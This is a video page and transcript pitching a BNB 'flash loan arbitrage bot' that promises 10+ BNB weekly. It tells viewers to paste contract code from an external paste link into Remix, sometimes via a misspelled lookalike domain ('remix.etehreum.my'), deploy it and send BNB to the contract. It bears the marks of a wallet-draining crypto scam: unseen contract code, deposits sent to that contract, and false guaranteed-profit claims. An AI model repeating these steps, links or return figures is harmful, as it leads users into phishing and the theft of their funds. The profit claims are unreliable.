title: Binance SmartChain Arbitrage Bot Tutorial | Earn 10 BNB+ Weekly with Pancakeswap Arbitrage| FEB 2025
description: #cryptoarbitrage #flashloan 30X BNB Return! Flash Loan Arbitrage tutorial for BNB Crypto using PancakeSwap and a flash loan from AAVE. This exploit enables you to trade against a flash loan and keep the remaining profit which is called a flash loan attack.  REMIX WEBSITE: https://remix.etehreum.my/ CONTRACT CODE: https://wtools.io/code/embed-js/bS7W  (Copy & Paste Link)  OR  **(CHECK COMMENT FOR REMIX LINK & CONTRACT CODE)**  Crypto liquidity deposit has to be a minimum of 1.0 per 2000 borrowed in the flash loan arbitrage  To get started on the crypto flash loan arbitrage, you need to have MetaMask browser extension installed. Go to metamask.io or google 'metamask' to ensure you land on the official site.  FLASH LOAN ARBITRAGE TUTORIAL INSTRUCTIONS  1. Download and setup the metamask browser wallet if you don't have it.   2. Make sure you have enough BNB crypto to pay for the token creation and flash loan contract gas fees    a. The amount of BNB crypto you want depends on how much of a loan you pull. It has to be a minimum of 0.5 for the contract to process fast enough. The higher the crypto liquidity, the higher the profit.   3. Open the remix compiler website in your browser  4. Click on contract folder on the left and click New File  5. Name the file something like flashloan.sol  6. Copy and paste the flash loan contract code into the new file  7. Select the second tab on the left  8. Choose the compiler that matches the top of the BNB flash loan contract code  9. Click on compile at the bottom  10. Once it is finished, go to the third tab on the left  11. Under environment, click on injected web3. This will connect to your metamask wallet so that you can interact.   12. Click on the arrow under deploy.   13. Enter the details for your new token. For the loan amount choose anything from 2000 and up. This needs to be in line with whatever liquidity you decide to deposit so it's usually 1.0 per 2000 BNB crypto borrowed in the flash loan.  14. Click transact and then confirm the gas fees to launch the token in metamask.   15. Under deployed contracts, copy the new token contract code.   16. Go to your Metamask or any wallet and send the liquidity to the new contract code.   17. Wait until the transaction is confirmed on the Binance Smart Chain  18. Once that is finished, click the arrow and click the red Action button and confirm the gas fees to execute the flash loan arbitrage.   19. That's it! The flash loan will be paid back automatically and any profit will be returned to your wallet in a few seconds/minutes.  Those are the steps to creating your own flash loan arbitrage attack.  #flashloan, #cryptoarbitrage

asr.full_text: In this example I've done, you'll see how I used just 0.3 BNB to gain over 10.7 BNB in just minutes. The first thing you want to do is go to remix.ethereum.org. This is where we program contracts for both the Ethereum and Binance network. On the left-hand side, click on contracts and then click this button for a new file. Name the file something like FlashLoan.sol Now you want to paste in the smart contract code into this new file. I'll put the newest updated code in the video description. Make sure you copy the entire file. Next, on the left hand menu, go over to the Second tab and pick the Compiler that matches the top of the code. Then go down and click compile. Once that's done, go over to the third tab on the left. Then, over here under environment, we want to click on injected web3. This will connect your Meta Mask browser wallet if it isn't connected already so that you can interact with the contract. I'll include instructions for Metamask wallet if you don't have it. It's essentially a browser wallet to use BNB. After you are connected, click on the arrow beside deploy. Here you are going to enter the information for the brand new token you want to create. Enter a name, symbol up to 6 letters and then the loan amount. This can be any amount from 1,000 and up! The higher initial deposit will have to be placed, but the higher the potential profit reward. Once you click Transact you'll get a pop-up asking for the gas fees to create your new token contract. Confirm in your wallet and then wait for the transaction confirmation. Once that is done you're going to want to go over to the newly created contract on the left-hand side here and click to copy the contact address. You are now going to add liquidity to make your new token have a value you can actually trade against. Go to your wallet and click send. Copy and paste the new contract code in here. Then, choose the amount of liquidity you want to place. Normally, it needs to be a minimum of 0.15 for there to be sufficient fees to make all the transfers. Use a ratio of 0.15 for every 1,000 you've borrowed in the loan amount. The higher the liquidity, the higher the return on investment. Here I will choose 0.3 BNB. Set up your deposit and then click to confirm. Wait for network confirmation. Now that your contract is created and we have some some liquidity in PancakeSwap to provide value, we are going to execute the flash loan attack. Go down here and click on the arrow next to your contract. And click the red button to execute your flash loan. A final small amount of gas fees to be paid for the action. Go ahead and confirm that. After your network confirmation, it to be paid for the action. Go ahead and confirm that. After your network confirmation it may take a few minutes to receive the return if everything was done correctly. Let's go ahead and wait now and see what happens! And there it is! Over 10 BNB in only a few minutes Now remember the return is different every time depending on the network volume and the amount of liquidity you put in We went from around 1 B&B to over 10 B & B If it doesn't work Or you don't get a large profit Try depositing a different amount of liquidity in your contract and then executing the loan again or Starting from the very beginning to make sure you did everything correctly The contract code and everything will be in the description.
